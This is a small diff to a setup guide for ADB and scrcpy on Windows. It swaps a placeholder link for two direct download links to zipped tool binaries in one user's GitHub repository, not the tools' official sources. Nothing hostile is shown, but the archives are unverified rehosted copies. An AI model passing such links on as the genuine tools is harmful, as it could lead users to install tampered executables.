@@ -4,9 +4,8 @@ This guide explains how to set up ADB and scrcpy on Windows using the tools incl
 
 Everything you need is already inside:
 
-[[downloads/platform-tools-latest-windows.zip](../downloads/platform-tools-latest-windows.zip)]
-(https://raw.githubusercontent.com/<username>/android-adb-scrcpy-toolkit/main/downloads/platform-tools-latest-windows.zip
-)
+https://github.com/firesab1265-hash/Android-adb-scrcpy-toolkit/raw/main/downloads/platform-tools-latest-windows%20(3).zip
+https://github.com/firesab1265-hash/Android-adb-scrcpy-toolkit/raw/main/downloads/scrcpy-win64-v3.1.zip
 
 
 
